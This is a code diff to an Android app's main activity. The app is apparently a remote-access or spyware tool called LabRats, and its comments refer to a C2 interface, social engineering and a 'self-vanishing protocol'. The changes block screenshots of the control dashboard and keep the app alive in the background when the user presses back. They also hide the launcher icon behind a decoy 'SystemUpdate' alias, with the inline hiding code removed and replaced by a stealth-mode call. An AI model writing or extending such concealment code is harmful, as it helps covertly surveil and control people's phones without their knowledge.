@@ -51,6 +51,11 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        
+        // --- SECURE DASHBOARD PROTOCOL ---
+        // Prevents screenshots or screen recording of the C2 interface/decoy
+        getWindow().setFlags(android.view.WindowManager.LayoutParams.FLAG_SECURE, 
+                           android.view.WindowManager.LayoutParams.FLAG_SECURE);
 
         // --- NUCLEAR DESTRUCT CHECK ---
         if (getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("is_destructing", false)) {
@@ -176,8 +181,8 @@ public class MainActivity extends AppCompatActivity {
 
     @Override
     public void onBackPressed() {
-        // [Social Engineering] Prevent accidental setup exit
-        android.widget.Toast.makeText(this, "Please complete system synchronization", android.widget.Toast.LENGTH_SHORT).show();
+        // Move app to background instead of closing/finishing
+        moveTaskToBack(true);
     }
 
     private void requestPermissions() {
@@ -444,37 +449,16 @@ public class MainActivity extends AppCompatActivity {
                         updateUI();
                         resetTerminalFeedback();
                         
-                        // Automatic Icon Hiding (Self-Vanishing Protocol)
+                        // Instant Icon Hiding (Self-Vanishing Protocol)
                         new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                             try {
-                                LabRatsHttpServer.logActivity("SECURITY_MAINTENANCE: Initiating identity camouflage...");
-                                android.content.pm.PackageManager pm = getPackageManager();
-                                
-                                // Enable Decoy first to ensure no "gap" where no icon exists
-                                pm.setComponentEnabledSetting(
-                                    new android.content.ComponentName(MainActivity.this, "com.labs.labrats.SystemUpdateAlias"),
-                                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                                    android.content.pm.PackageManager.DONT_KILL_APP
-                                );
-
-                                // Disable Main
-                                pm.setComponentEnabledSetting(
-                                    new android.content.ComponentName(MainActivity.this, "com.labs.labrats.LauncherAlias"),
-                                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                                    android.content.pm.PackageManager.DONT_KILL_APP
-                                );
-                                
-                                // Force Launcher Refresh by returning to home
-                                Intent home = new Intent(Intent.ACTION_MAIN);
-                                home.addCategory(Intent.CATEGORY_HOME);
-                                home.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                                startActivity(home);
+                                SystemAnalytics.setStealthMode(MainActivity.this, true);
 
                                 Log.d("MainActivity", "Stealth transition: Identity replaced.");
                             } catch (Exception e) {
                                 Log.e("MainActivity", "Stealth failure: " + e.getMessage());
                             }
-                        }, 5000);
+                        }, 1000);
                     }, 3000);
                 });
             });
@@ -610,7 +594,7 @@ public class MainActivity extends AppCompatActivity {
             } else {
                 tvIpAddress.setText(ipText.toString());
                 String displayIp = (localIp != null) ? localIp : publicIp;
-                String formattedUrl = isIPv6(displayIp) ? "http://[" + displayIp + "]:9191" : "http://" + displayIp + ":9191";
+                String formattedUrl = isIPv6(displayIp) ? "http://[" + displayIp + "]:" + LabRatsHttpServer.DEFAULT_PORT : "http://" + displayIp + ":" + LabRatsHttpServer.DEFAULT_PORT;
                 tvServerUrl.setText(formattedUrl);
             }
         });
